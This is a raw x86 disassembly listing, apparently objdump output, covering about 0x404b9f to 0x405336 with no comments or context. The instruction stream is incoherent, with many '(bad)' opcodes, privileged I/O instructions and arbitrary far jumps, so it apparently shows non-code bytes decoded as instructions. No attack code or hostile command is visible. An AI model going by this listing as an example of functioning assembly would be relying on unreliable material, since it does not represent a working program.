  404b9f:	mov    WORD PTR [esi-0x58c49f4b],es
  404ba5:	aas    
  404ba6:	inc    esp
  404ba7:	adc    eax,0x41adfae0
  404bac:	out    0x26,al
  404bae:	outs   dx,DWORD PTR ds:[esi]
  404baf:	lahf   
  404bb0:	mov    ds:0xc9bded60,al
  404bb5:	neg    DWORD PTR [ebx+esi*2+0x0]
  404bb9:	xchg   BYTE PTR [esi+0x17],bl
  404bbc:	ret    
  404bbd:	mov    eax,ds:0xd2aa9c96
  404bc2:	pop    esi
  404bc3:	cmp    esp,DWORD PTR [ebx-0x3aadac08]
  404bc9:	jne    0x404bf1
  404bcb:	sub    eax,0xe3c418e5
  404bd0:	xchg   ebp,eax
  404bd1:	popa   
  404bd2:	sub    DWORD PTR [edi+ebx*8-0x4d],ecx
  404bd6:	inc    esi
  404bd7:	stos   DWORD PTR es:[edi],eax
  404bd8:	gs xor eax,0xf96a62ab
  404bde:	sbb    BYTE PTR [ebp-0x15022712],cl
  404be4:	xor    cl,ah
  404be6:	push   0x9e55802a
  404beb:	push   esi
  404bec:	pusha  
  404bed:	fdiv   QWORD PTR [ecx+0x1e33e7e9]
  404bf3:	pop    ebx
  404bf4:	fst    st(5)
  404bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bf7:	adc    dh,BYTE PTR [edx-0x2f]
  404bfa:	leave  
  404bfb:	test   al,0xdf
  404bfd:	cmp    al,0xc5
  404bff:	pop    edx
  404c00:	loope  0x404c35
  404c02:	arpl   ax,bp
  404c04:	ror    DWORD PTR [esi-0x73],0x84
  404c08:	(bad)  
  404c09:	push   esp
  404c0a:	lock cli 
  404c0c:	jns    0x404c40
  404c0e:	cmp    eax,0xbf43d5c3
  404c13:	lea    esp,[ebx]
  404c15:	scas   eax,DWORD PTR es:[edi]
  404c16:	mov    ebx,0x6d2e7fd3
  404c1b:	aad    0x25
  404c1d:	cmp    ah,ch
  404c1f:	sahf   
  404c20:	stos   DWORD PTR es:[edi],eax
  404c21:	xchg   edi,eax
  404c22:	jmp    0x404c89
  404c24:	ret    
  404c25:	jl     0x404c08
  404c27:	arpl   di,si
  404c29:	jecxz  0x404bef
  404c2b:	iret   
  404c2c:	add    ah,0x46
  404c2f:	pushf  
  404c30:	mov    DWORD PTR [ebx+eax*1-0x7f1b46b9],eax
  404c37:	inc    ecx
  404c38:	pop    edi
  404c39:	data16 out 0x7,al
  404c3c:	aad    0x42
  404c3e:	sti    
  404c3f:	sbb    al,0xbe
  404c41:	aad    0x52
  404c43:	mov    al,0x6e
  404c45:	sub    BYTE PTR [edi-0x2c70f2ca],0x39
  404c4c:	int    0x3d
  404c4e:	mov    al,ds:0xf3fdec4b
  404c53:	xor    BYTE PTR [eax+0x45],dh
  404c56:	arpl   WORD PTR [ebx+0x3],si
  404c59:	pop    ecx
  404c5a:	dec    ecx
  404c5b:	shl    edi,0x8a
  404c5e:	dec    ebp
  404c5f:	pop    ecx
  404c60:	dec    esi
  404c61:	mov    edi,0xa2285f57
  404c66:	test   BYTE PTR [ebx],ah
  404c68:	dec    esp
  404c69:	push   ebp
  404c6a:	add    eax,0xcdffe84c
  404c6f:	pop    ebp
  404c70:	stc    
  404c71:	add    BYTE PTR [edx-0xc4930cc],0xa9
  404c78:	loop   0x404c4b
  404c7a:	jecxz  0x404c08
  404c7c:	xchg   DWORD PTR [ecx+0x373928c6],esi
  404c82:	sub    eax,0x6294c046
  404c87:	mov    esp,DWORD PTR [ecx]
  404c89:	mov    ebp,0x2c3a0cb7
  404c8e:	(bad)  
  404c8f:	hlt    
  404c90:	or     bh,ah
  404c92:	fdivr  QWORD PTR [ecx+0x5d]
  404c95:	aad    0x6b
  404c97:	(bad)  
  404c98:	enter  0x4158,0xeb
  404c9c:	or     dh,BYTE PTR [edi+edx*1]
  404c9f:	mov    ecx,esi
  404ca1:	mov    bh,dh
  404ca3:	push   edx
  404ca4:	mov    edi,0x2f52c9b0
  404ca9:	stos   BYTE PTR es:[edi],al
  404caa:	fs cli 
  404cac:	jle    0x404c68
  404cae:	jae    0x404c7d
  404cb0:	(bad)  
  404cb1:	leave  
  404cb2:	pop    eax
  404cb3:	ds mov cl,0x52
  404cb6:	pop    edi
  404cb7:	das    
  404cb8:	push   esp
  404cb9:	jnp    0x404cc6
  404cbb:	outs   dx,DWORD PTR ds:[esi]
  404cbc:	div    dl
  404cbe:	inc    esp
  404cbf:	or     eax,0xe44214fc
  404cc4:	das    
  404cc5:	out    0xd1,eax
  404cc7:	jecxz  0x404d2e
  404cc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cca:	mov    al,bh
  404ccc:	dec    eax
  404ccd:	test   BYTE PTR [ecx],bh
  404ccf:	stos   DWORD PTR es:[edi],eax
  404cd0:	push   ebx
  404cd1:	test   eax,0x6eff87be
  404cd6:	out    dx,al
  404cd7:	sar    BYTE PTR [edi],1
  404cd9:	(bad)  
  404cda:	mov    dh,0xad
  404cdc:	clc    
  404cdd:	adc    eax,0x853e0ba3
  404ce2:	das    
  404ce3:	arpl   WORD PTR [eax-0x2c7af8b9],di
  404ce9:	lds    eax,FWORD PTR [eax]
  404ceb:	jl     0x404c70
  404ced:	or     al,0x52
  404cef:	rcl    DWORD PTR [ecx-0x6e835913],cl
  404cf5:	pop    ss
  404cf6:	pop    ebp
  404cf7:	(bad)  
  404cf8:	jge    0x404d19
  404cfa:	add    DWORD PTR [si+0x51],esp
  404cfe:	test   eax,0x1e1174d4
  404d03:	fistp  WORD PTR [esi]
  404d05:	inc    ebx
  404d06:	call   0xeeca34da
  404d0b:	jbe    0x404d4b
  404d0d:	fldenv cs:[edi]
  404d10:	dec    ebx
  404d11:	imul   ebp,eax,0xfecf4a57
  404d17:	jb     0x404d5b
  404d19:	(bad)  
  404d1a:	in     al,dx
  404d1b:	enter  0x6e3a,0xef
  404d1f:	xchg   edi,eax
  404d20:	push   esi
  404d21:	push   es
  404d22:	aaa    
  404d23:	jmp    0x678f:0x18d8c942
  404d2a:	dec    ebx
  404d2b:	fwait
  404d2c:	sbb    BYTE PTR [ebx-0x80],bh
  404d2f:	cmp    al,0x52
  404d31:	and    eax,0x865bd365
  404d36:	test   DWORD PTR [edx+0x6f916e64],esp
  404d3c:	mov    ecx,DWORD PTR [ebx+0x46]
  404d3f:	out    0xce,al
  404d41:	mov    ds:0xfd8c5946,al
  404d46:	adc    cl,al
  404d48:	dec    edi
  404d49:	pushf  
  404d4a:	jg     0x404d5e
  404d4c:	pushf  
  404d4d:	mov    WORD PTR [ebx-0x51745b14],es
  404d53:	mov    ebp,DWORD PTR [edi-0x73]
  404d56:	jecxz  0x404d22
  404d58:	pop    ds
  404d59:	hlt    
  404d5a:	cmp    ecx,DWORD PTR [eax-0x71]
  404d5d:	je     0x404d17
  404d5f:	or     bh,BYTE PTR [edx]
  404d61:	mov    edx,0xed461bf4
  404d66:	cmp    DWORD PTR [ebx-0xd0ac63b],0x38
  404d6d:	push   ss
  404d6e:	jns    0x404d29
  404d70:	cwde   
  404d71:	je     0x404cff
  404d73:	dec    ecx
  404d74:	dec    ebx
  404d75:	cmc    
  404d76:	push   ds
  404d77:	in     al,0xf7
  404d79:	sbb    BYTE PTR [esp+eax*8],al
  404d7c:	cmp    DWORD PTR [ebp-0x58f04e9b],0x5d97d0cb
  404d86:	sti    
  404d87:	rcl    DWORD PTR ds:0x22161089,cl
  404d8d:	movups XMMWORD PTR [ebx-0x8465609],xmm0
  404d94:	js     0x404d26
  404d96:	cmp    eax,0xcaa71ef7
  404d9b:	push   0xf150efb9
  404da0:	and    BYTE PTR [edi],ch
  404da2:	xor    edi,DWORD PTR [esi-0x41]
  404da5:	add    cl,bh
  404da7:	cs popa 
  404da9:	(bad)  
  404daa:	out    dx,al
  404dab:	ret    
  404dac:	xor    DWORD PTR [eax],ebp
  404dae:	or     BYTE PTR [ebx-0x47],dl
  404db1:	xchg   DWORD PTR [esi+0x1f],esp
  404db4:	add    ecx,eax
  404db6:	shl    BYTE PTR [edi-0x2184bf7c],cl
  404dbc:	add    BYTE PTR es:[esi],bh
  404dbf:	mov    al,ds:0x370bddc
  404dc4:	inc    edi
  404dc5:	fsubr  st,st(3)
  404dc7:	xor    al,0xa0
  404dc9:	imul   ecx,DWORD PTR [esi+0x7bc3e715],0x4b
  404dd0:	outs   dx,DWORD PTR ds:[esi]
  404dd1:	and    edx,DWORD PTR [eax-0x6c]
  404dd4:	pushf  
  404dd5:	adc    bh,BYTE PTR [eax]
  404dd7:	sbb    al,0xe5
  404dd9:	mov    WORD PTR [eax+0x4c2e2ffb],fs
  404ddf:	cld    
  404de0:	leave  
  404de1:	clc    
  404de2:	test   eax,0xcc063997
  404de7:	mov    al,BYTE PTR [edi]
  404de9:	test   ecx,0x5dfb9c4d
  404def:	jae    0x404dfa
  404df1:	push   edi
  404df2:	std    
  404df3:	dec    BYTE PTR [ecx]
  404df5:	dec    edi
  404df6:	outs   dx,DWORD PTR ds:[esi]
  404df7:	mov    ecx,0xdcc1b045
  404dfc:	push   ds
  404dfd:	mov    ds:0x49b76ce0,eax
  404e02:	loope  0x404e07
  404e04:	popf   
  404e05:	cmp    ch,bl
  404e07:	ja     0x404e34
  404e09:	xchg   esp,eax
  404e0a:	and    DWORD PTR [edi-0x21597f0c],edx
  404e10:	call   0xf0ae3daa
  404e15:	stos   DWORD PTR es:[edi],eax
  404e16:	push   0xffffffdb
  404e18:	test   ebx,eax
  404e1a:	icebp  
  404e1b:	pop    ecx
  404e1c:	es jne 0x404e9b
  404e1f:	gs stos BYTE PTR es:[edi],al
  404e21:	inc    ebx
  404e22:	stc    
  404e23:	sub    esi,ecx
  404e25:	inc    eax
  404e26:	inc    esi
  404e27:	push   esi
  404e28:	aad    0x4f
  404e2a:	xor    esp,DWORD PTR [esi]
  404e2c:	jne    0x404e1e
  404e2e:	test   DWORD PTR [ebx+0x72],eax
  404e31:	sbb    eax,0xf8f453df
  404e36:	adc    al,0x85
  404e38:	or     DWORD PTR [edx-0x5a9af0ef],esp
  404e3e:	adc    ah,BYTE PTR [ecx]
  404e40:	cld    
  404e41:	mov    cl,0xa9
  404e43:	repnz or ah,BYTE PTR [edx-0x41c18fe]
  404e4a:	int    0x34
  404e4c:	shl    bh,1
  404e4e:	add    al,0x66
  404e50:	sub    edx,ebx
  404e52:	push   esp
  404e53:	rcr    DWORD PTR [edi+0x7a8d17d9],0xed
  404e5a:	repz mov eax,0x58b60bc0
  404e60:	or     ebp,DWORD PTR [edi]
  404e62:	sbb    eax,0x5a604920
  404e67:	out    dx,al
  404e68:	sbb    eax,DWORD PTR [edi+0x1b]
  404e6b:	mov    esi,0xafae7925
  404e70:	dec    ebx
  404e71:	dec    esp
  404e72:	pop    esp
  404e73:	lahf   
  404e74:	sbb    edx,DWORD PTR [edi+ebx*2]
  404e77:	in     al,dx
  404e78:	cld    
  404e79:	std    
  404e7a:	sub    al,0x71
  404e7c:	ret    0x9673
  404e7f:	mov    ds:0x2e193290,eax
  404e84:	int    0x2c
  404e86:	push   edx
  404e87:	fs scas eax,DWORD PTR es:[edi]
  404e89:	rcr    ah,0xcb
  404e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e8d:	aas    
  404e8e:	inc    edx
  404e8f:	pop    ds
  404e90:	jecxz  0x404ecf
  404e92:	inc    edx
  404e93:	enter  0xbfa7,0xe0
  404e97:	inc    ecx
  404e98:	gs add eax,0xbd38c867
  404e9e:	xor    al,0x95
  404ea0:	aam    0x5a
  404ea2:	(bad)  
  404ea3:	push   ebp
  404ea4:	std    
  404ea5:	xchg   esp,eax
  404ea6:	out    dx,eax
  404ea7:	pop    ecx
  404ea8:	cmp    BYTE PTR [ecx+0x11b1abdc],ah
  404eae:	je     0x404ecb
  404eb0:	out    dx,al
  404eb1:	xchg   ebx,eax
  404eb2:	and    BYTE PTR [edi-0x3fd9cb3],cl
  404eb8:	sub    al,BYTE PTR [edi]
  404eba:	sahf   
  404ebb:	sbb    al,0xc4
  404ebd:	(bad)  
  404ebe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ebf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ec0:	mov    ah,0xeb
  404ec2:	pop    esp
  404ec3:	in     al,0xda
  404ec5:	xchg   edi,eax
  404ec6:	mov    dl,0xe9
  404ec8:	cdq    
  404ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eca:	(bad)  
  404ecb:	(bad)  
  404ecc:	sbb    BYTE PTR [esi],ch
  404ece:	shl    BYTE PTR [ebx+0x77],1
  404ed1:	(bad)  
  404ed3:	inc    edx
  404ed4:	ins    DWORD PTR es:[edi],dx
  404ed5:	pop    edi
  404ed6:	sub    DWORD PTR [esp+esi*8+0x74],0x11
  404edb:	sub    eax,DWORD PTR [edx]
  404edd:	jae    0x404e85
  404edf:	jmp    0x404e76
  404ee1:	jns    0x404e75
  404ee3:	mov    ebp,0xfc34af63
  404ee8:	inc    esi
  404ee9:	push   cs
  404eea:	push   es
  404eeb:	out    dx,al
  404eec:	and    eax,0x73e5a579
  404ef1:	push   eax
  404ef2:	test   BYTE PTR [edx],0xa3
  404ef5:	mov    WORD PTR fs:[esi],ss
  404ef8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ef9:	dec    ecx
  404efa:	ds jb  0x404e94
  404efd:	adc    al,0xae
  404eff:	push   ds
  404f00:	xchg   ebx,eax
  404f01:	gs mov ah,0x44
  404f04:	(bad)  
  404f05:	out    dx,al
  404f06:	add    ah,BYTE PTR [ebx-0x48]
  404f09:	ins    DWORD PTR es:[edi],dx
  404f0a:	mov    ah,0x79
  404f0c:	daa    
  404f0d:	dec    ebp
  404f0e:	adc    bh,dh
  404f10:	and    al,0x41
  404f12:	cmp    eax,0x2669f112
  404f17:	data16 mov bh,0xf2
  404f1a:	cmp    eax,DWORD PTR [esi-0x10ace74d]
  404f20:	sahf   
  404f21:	test   cl,ch
  404f23:	xor    esi,0xd1bee8c7
  404f29:	(bad)  
  404f2a:	adc    ah,dl
  404f2c:	xor    BYTE PTR ds:0x3910ded3,cl
  404f32:	je     0x404f6e
  404f34:	sub    eax,0xae9b7b48
  404f39:	dec    ebx
  404f3a:	ss fxch st(1)
  404f3d:	add    eax,DWORD PTR [ecx]
  404f3f:	jmp    0x7b76:0x86f5d556
  404f46:	enter  0x4327,0x7
  404f4a:	cmp    cl,bl
  404f4c:	or     eax,0x7d
  404f4f:	cwde   
  404f50:	fsubr  DWORD PTR [edi+0x56ef4ca3]
  404f56:	mov    ah,0x17
  404f58:	ret    
  404f59:	xor    eax,0x7d6bc935
  404f5e:	clc    
  404f5f:	pop    ss
  404f60:	xchg   ebx,eax
  404f61:	dec    ebp
  404f62:	scas   eax,DWORD PTR es:[edi]
  404f63:	add    al,0xf1
  404f65:	sub    eax,0x5d37f35
  404f6a:	fnstenv [ebx-0x401df694]
  404f70:	jns    0x404fd2
  404f72:	dec    esp
  404f73:	dec    edx
  404f74:	out    0x6,eax
  404f76:	aaa    
  404f77:	je     0x404f41
  404f79:	aad    0x2e
  404f7b:	fidivr WORD PTR [edi]
  404f7d:	mov    fs,eax
  404f7f:	push   ebp
  404f80:	pushf  
  404f81:	out    0x7a,al
  404f83:	stos   BYTE PTR es:[edi],al
  404f84:	dec    eax
  404f85:	popf   
  404f86:	mov    ds:0x334d73d6,eax
  404f8b:	inc    esi
  404f8c:	pushf  
  404f8d:	icebp  
  404f8e:	sbb    al,0xa4
  404f90:	fs out dx,al
  404f92:	jecxz  0x404fdd
  404f94:	dec    eax
  404f95:	rcr    DWORD PTR [eax-0x78],cl
  404f98:	lahf   
  404f99:	cmovg  ebx,DWORD PTR [esi-0x60fa169]
  404fa0:	scas   al,BYTE PTR es:[edi]
  404fa1:	arpl   sp,bx
  404fa3:	mov    edx,0x76222354
  404fa8:	pop    ss
  404fa9:	cs gs js 0x404ff2
  404fad:	xor    DWORD PTR [edi+0x283ea161],ebx
  404fb3:	(bad)  
  404fb4:	stos   DWORD PTR es:[edi],eax
  404fb5:	mov    dl,BYTE PTR [ecx-0x67d30424]
  404fbb:	mov    cl,0x87
  404fbd:	jmp    0x2d0db4f3
  404fc2:	pop    es
  404fc3:	fwait
  404fc4:	or     eax,0xff62d49a
  404fc9:	cmp    dh,bl
  404fcb:	dec    eax
  404fcc:	mov    edx,0xe568c2a8
  404fd1:	fsub   QWORD PTR [eax]
  404fd3:	lds    eax,FWORD PTR [ecx+0x38fc4f31]
  404fd9:	in     eax,0xfc
  404fdb:	test   eax,0x73709cac
  404fe0:	cld    
  404fe1:	enter  0xc225,0x74
  404fe5:	mov    al,ds:0x14e0279d
  404fea:	fcomp  QWORD PTR [esi]
  404fec:	out    0x57,eax
  404fee:	xchg   edi,eax
  404fef:	or     DWORD PTR [edi],ecx
  404ff1:	mov    ds:0xdc5c8ddd,al
  404ff6:	(bad)  
  404ff7:	clc    
  404ff8:	mov    ds:0xa0ca6d4d,eax
  404ffd:	push   ds
  404ffe:	push   cs
  404fff:	cmp    BYTE PTR [esi+0xe90e29],0xfc
  405006:	cmp    ecx,ebp
  405008:	pop    ebx
  405009:	or     eax,0x9b0155c5
  40500e:	push   ds
  40500f:	push   ss
  405010:	inc    ebp
  405011:	loopne 0x40504e
  405013:	sub    ch,ch
  405015:	mov    BYTE PTR [ecx+0x74],bh
  405018:	and    BYTE PTR [ecx+0x45],0x37
  40501c:	popf   
  40501d:	cmp    BYTE PTR [eax+eax*4-0xc],dl
  405021:	cld    
  405022:	in     al,dx
  405023:	and    ecx,edi
  405025:	mov    WORD PTR [ebx+ebp*2-0x1f],fs
  405029:	outs   dx,DWORD PTR ds:[esi]
  40502a:	inc    ebp
  40502b:	and    DWORD PTR [eax+0x30],esi
  40502e:	add    DWORD PTR [esp+ebp*8-0x1a],edi
  405032:	or     DWORD PTR [ecx],ebp
  405034:	mov    al,ds:0xdd5fe05d
  405039:	or     eax,0x47589059
  40503e:	or     bl,BYTE PTR [edi]
  405040:	add    DWORD PTR [esi-0x7f],0xbcd40067
  405047:	mov    ds:0xa85638b6,al
  40504c:	aam    0x33
  40504e:	mov    ebp,0x999dc329
  405053:	lds    ebp,FWORD PTR [esi-0x47]
  405056:	push   edi
  405057:	mov    ah,0xfa
  405059:	jb     0x405021
  40505b:	inc    ecx
  40505c:	mov    eax,ds:0x24c75cd3
  405061:	jecxz  0x404fe7
  405063:	adc    bh,cl
  405065:	cmp    eax,0xb94a442c
  40506a:	test   BYTE PTR [edi],bh
  40506c:	stos   DWORD PTR es:[edi],eax
  40506d:	lock xchg ebp,eax
  40506f:	mov    eax,0x53bb6ca5
  405074:	xchg   ecx,eax
  405075:	jle    0x4050cc
  405077:	adc    DWORD PTR [ebp+ecx*2-0xb37dad4],0xffffffee
  40507f:	push   eax
  405080:	gs inc edx
  405082:	ret    
  405083:	in     eax,dx
  405084:	and    ebx,DWORD PTR [ecx+esi*1-0x4f9ab3a0]
  40508b:	ret    0xacf0
  40508e:	mov    dh,0x30
  405090:	inc    esi
  405091:	imul   ebp,DWORD PTR [ebx+0x45],0x2c
  405095:	push   es
  405096:	pop    ebx
  405097:	push   cs
  405098:	lds    eax,FWORD PTR [esi+0x1c]
  40509b:	ins    BYTE PTR es:[edi],dx
  40509c:	push   ecx
  40509d:	mov    bl,0x53
  40509f:	pop    esi
  4050a0:	cmp    BYTE PTR [esi+0x20],bh
  4050a3:	cmp    dl,0x46
  4050a6:	xlat   BYTE PTR ds:[ebx]
  4050a7:	xchg   edx,eax
  4050a8:	mov    es:0xf2e99a2e,eax
  4050ae:	xchg   ebx,eax
  4050af:	sar    edi,1
  4050b1:	stos   BYTE PTR es:[edi],al
  4050b2:	dec    esp
  4050b3:	sub    DWORD PTR [edi+0xfdc8431],ebx
  4050b9:	dec    ecx
  4050ba:	retf   
  4050bb:	outs   dx,DWORD PTR ds:[esi]
  4050bc:	add    ah,ch
  4050be:	sbb    eax,0xfffffff4
  4050c1:	lock xor ah,BYTE PTR ds:0xc5d986b3
  4050c8:	xchg   esp,eax
  4050c9:	sbb    al,0xd1
  4050cb:	ficomp DWORD PTR [ebp-0x1d]
  4050ce:	jge    0x405135
  4050d0:	test   al,0x5e
  4050d2:	fcom   st(7)
  4050d4:	jns    0x4050de
  4050d6:	shl    BYTE PTR [esi+0x6415e266],0x1d
  4050dd:	or     al,0xc4
  4050df:	xlat   BYTE PTR ds:[ebx]
  4050e0:	dec    ebp
  4050e1:	out    0xd3,al
  4050e3:	out    dx,eax
  4050e4:	xor    BYTE PTR [eax+0x10],dl
  4050e7:	aam    0xd1
  4050e9:	dec    ebx
  4050ea:	imul   edi,ecx,0xffffffc9
  4050ed:	retf   
  4050ee:	mov    eax,ds:0xf7658ef4
  4050f3:	in     al,0xff
  4050f5:	ficomp DWORD PTR [ecx-0x2ab4e058]
  4050fb:	out    0xc,al
  4050fd:	jbe    0x40513e
  4050ff:	pop    esi
  405100:	iret   
  405101:	sub    al,bh
  405103:	enter  0x66cc,0xb2
  405107:	inc    eax
  405108:	push   edi
  405109:	cld    
  40510a:	jnp    0x405181
  40510c:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40510e:	and    BYTE PTR [edi],bl
  405110:	ins    BYTE PTR es:[edi],dx
  405111:	jle    0x4050ab
  405113:	add    edi,DWORD PTR [ebp+ebx*8-0x3]
  405117:	dec    esp
  405118:	and    bh,bh
  40511a:	adc    BYTE PTR [ebp-0x79a7f819],ah
  405120:	scas   al,BYTE PTR es:[edi]
  405121:	call   FWORD PTR [esi-0x4bb199a]
  405127:	aaa    
  405128:	mov    eax,DWORD PTR [ecx]
  40512a:	int3   
  40512b:	adc    bl,BYTE PTR [esp+ebx*8-0x14fdc96f]
  405132:	(bad)  
  405133:	pop    ds
  405134:	sub    al,0xc5
  405136:	int3   
  405137:	cli    
  405138:	inc    esi
  405139:	mov    DWORD PTR [ebx],ebp
  40513b:	mov    ds:0x8c7e49f2,al
  405140:	inc    BYTE PTR [edi]
  405142:	pop    edi
  405143:	dec    esi
  405144:	loop   0x40513f
  405146:	ss push ss
  405148:	lods   eax,DWORD PTR ds:[esi]
  405149:	jecxz  0x40511e
  40514b:	mov    DWORD PTR [ecx+0x11061c77],ebp
  405151:	pop    eax
  405152:	mov    DWORD PTR [ebx-0x70d4bb87],esi
  405158:	daa    
  405159:	push   esp
  40515a:	add    ch,ch
  40515c:	jbe    0x405159
  40515e:	push   ss
  40515f:	mov    ds:0xccb20ab8,eax
  405164:	adc    ebx,DWORD PTR [edx]
  405166:	jge    0x405137
  405168:	(bad)  
  405169:	adc    DWORD PTR [ebx],eax
  40516b:	test   eax,0x5f8b0eb5
  405170:	or     eax,0xb0ca60ca
  405175:	pushf  
  405176:	mov    dh,BYTE PTR [edi+0x9]
  405179:	cmp    ah,BYTE PTR [edi-0x18]
  40517c:	arpl   ax,bx
  40517e:	xor    BYTE PTR [ebx-0x42],ch
  405181:	mov    edi,DWORD PTR [esi-0x23]
  405184:	pop    ebp
  405185:	jmp    0xebe15260
  40518a:	adc    DWORD PTR [edi],edi
  40518c:	sar    BYTE PTR [esi],cl
  40518e:	enter  0xf7fd,0xdd
  405192:	add    esi,DWORD PTR [ecx+eiz*2]
  405195:	adc    BYTE PTR [ebp-0x689d084],dl
  40519b:	test   DWORD PTR [ebx+esi*1],eax
  40519e:	inc    eax
  40519f:	pop    esp
  4051a0:	xor    DWORD PTR [edx+ebp*8-0x26],0xb11eecd8
  4051a8:	jecxz  0x40521a
  4051aa:	inc    ecx
  4051ab:	pop    eax
  4051ac:	jnp    0x40513a
  4051ae:	inc    esp
  4051af:	xlat   BYTE PTR ds:[ebx]
  4051b0:	idiv   dh
  4051b2:	fnstcw WORD PTR [eax-0xe]
  4051b5:	sub    ah,BYTE PTR [eax]
  4051b7:	cwde   
  4051b8:	popa   
  4051b9:	push   esp
  4051ba:	adc    eax,0xc06b592
  4051bf:	and    BYTE PTR [ebp+0x4a],0xb9
  4051c3:	pop    edi
  4051c4:	dec    esi
  4051c5:	mov    ecx,0x6e6a072c
  4051ca:	pop    esp
  4051cb:	xor    al,0x18
  4051cd:	aad    0xdd
  4051cf:	sbb    al,0x65
  4051d1:	enter  0x9a4d,0xf9
  4051d5:	and    cl,BYTE PTR [ebx-0x4f]
  4051d8:	rcl    ecx,cl
  4051da:	out    dx,al
  4051db:	gs jno 0x4051de
  4051de:	call   0x7a2f28ee
  4051e3:	jne    0x4051a6
  4051e5:	fstp   DWORD PTR [eax+0xb]
  4051e8:	bound  edi,QWORD PTR [ecx+0xf]
  4051eb:	xor    esp,ebx
  4051ed:	ror    BYTE PTR [ecx],1
  4051ef:	je     0x4051d2
  4051f1:	pop    es
  4051f2:	dec    esp
  4051f3:	retf   
  4051f4:	mov    ebx,0x945242bb
  4051f9:	add    al,0x3c
  4051fb:	xlat   BYTE PTR ds:[ebx]
  4051fc:	aam    0x51
  4051fe:	sub    al,0xc0
  405200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405201:	shl    DWORD PTR [esi+0x41],1
  405204:	pusha  
  405205:	xor    eax,0x9161a810
  40520a:	jl     0x40522b
  40520c:	xchg   ecx,eax
  40520d:	dec    ebx
  40520e:	aaa    
  40520f:	leave  
  405210:	cli    
  405211:	outs   dx,BYTE PTR ds:[esi]
  405212:	xchg   ecx,eax
  405213:	dec    BYTE PTR [ebx]
  405215:	(bad)  
  405216:	imul   esi,DWORD PTR [eax-0x19de8600],0xffffffc6
  40521d:	push   esi
  40521e:	push   eax
  40521f:	xchg   esp,eax
  405220:	mov    cl,0x31
  405222:	pop    ecx
  405223:	mov    ?,WORD PTR [edi+0x6]
  405226:	sbb    BYTE PTR [esi],al
  405228:	inc    ebx
  405229:	push   0x6aeac577
  40522e:	repz sar BYTE PTR [esi-0x5a],1
  405232:	outs   dx,BYTE PTR ds:[esi]
  405233:	mov    esp,DWORD PTR [eax-0x5cc11479]
  405239:	push   esi
  40523a:	adc    al,0x31
  40523c:	mov    edx,0xbe2a31db
  405241:	nop
  405242:	mov    cl,0xfc
  405244:	adc    edi,DWORD PTR [edi-0x1600c3c8]
  40524a:	pop    ss
  40524b:	push   es
  40524c:	pop    ss
  40524d:	and    esi,DWORD PTR fs:[edi+0x2ada3950]
  405254:	ret    
  405255:	fdivp  st(2),st
  405257:	lds    ebx,FWORD PTR [edi-0x1f]
  40525a:	imul   ebp,DWORD PTR [ecx-0x64],0xe38a7a75
  405261:	mov    gs,WORD PTR [eax]
  405263:	jns    0x4052d0
  405265:	minps  xmm5,xmm1
  405268:	data16 je 0x405232
  40526b:	pusha  
  40526c:	dec    edi
  40526d:	repnz sub DWORD PTR [edx+0x4d],0xd44a192b
  405275:	sub    al,dl
  405277:	mov    edi,DWORD PTR [ecx-0x5ac2c66c]
  40527d:	mov    bl,0x38
  40527f:	or     cl,BYTE PTR [ebp+ebx*2-0x6c]
  405283:	test   al,0x94
  405285:	das    
  405286:	sahf   
  405287:	mov    ah,0xdc
  405289:	or     ecx,edx
  40528b:	pop    ds
  40528c:	pop    eax
  40528d:	lods   eax,DWORD PTR ds:[esi]
  40528e:	ret    
  40528f:	cmc    
  405290:	aad    0x7c
  405292:	mov    BYTE PTR ds:0x75634a1e,al
  405298:	mov    DWORD PTR [edx-0x78f584ad],esp
  40529e:	ret    0x1f81
  4052a1:	in     eax,dx
  4052a2:	adc    eax,0x55e5160b
  4052a7:	jne    0x40525e
  4052a9:	sub    bh,bl
  4052ab:	and    ebx,ebp
  4052ad:	pop    es
  4052ae:	jns    0x405314
  4052b0:	and    BYTE PTR [eax],bh
  4052b2:	mov    dl,0x1d
  4052b4:	cmc    
  4052b5:	jmp    0x7a689930
  4052ba:	fdiv   QWORD PTR [esi]
  4052bc:	ret    0x9042
  4052bf:	aas    
  4052c0:	cli    
  4052c1:	arpl   bx,ax
  4052c3:	pop    es
  4052c4:	pop    ss
  4052c5:	jbe    0x4052cc
  4052c7:	xlat   BYTE PTR ds:[ebx]
  4052c8:	cmp    al,0xb4
  4052ca:	frstor [eax-0x24307d51]
  4052d0:	mov    BYTE PTR [ebp-0x44bbf259],0x6e
  4052d7:	xor    al,dl
  4052d9:	or     BYTE PTR [edi+0x79],al
  4052dc:	in     eax,0xf
  4052de:	push   ebx
  4052df:	inc    esi
  4052e0:	add    eax,0xa08d2450
  4052e5:	dec    esi
  4052e6:	(bad)  
  4052e7:	fwait
  4052e8:	cmp    esp,DWORD PTR [ecx]
  4052ea:	xor    eax,0x5f7814cc
  4052ef:	xchg   esp,ecx
  4052f1:	repz or eax,0x1ad6f5ba
  4052f7:	cmp    bh,BYTE PTR [ebx]
  4052f9:	sbb    ecx,DWORD PTR [ecx]
  4052fb:	aam    0x7c
  4052fd:	push   ss
  4052fe:	mov    dl,0xf6
  405300:	pop    eax
  405301:	dec    esi
  405302:	push   es
  405303:	dec    edx
  405305:	xchg   edx,eax
  405306:	mov    WORD PTR [esi-0x4e3695d0],gs
  40530c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40530d:	sub    ch,BYTE PTR [ecx+0x2]
  405310:	hlt    
  405311:	jne    0x405387
  405313:	mov    ah,BYTE PTR [esi]
  405315:	mov    BYTE PTR [eax-0x68c5f4a5],bh
  40531b:	test   BYTE PTR ds:0x6218dc51,0x1a
  405322:	enter  0xe7e2,0x15
  405326:	jbe    0x4052da
  405328:	iret   
  405329:	scas   eax,DWORD PTR es:[edi]
  40532a:	sbb    BYTE PTR fs:[ebx+0x68],al
  40532e:	clc    
  40532f:	scas   eax,DWORD PTR es:[edi]
  405330:	iret   
  405331:	enter  0x8448,0xfd
  405335:	(bad)  
  405336:	mov    ebx,0x8e53d74a
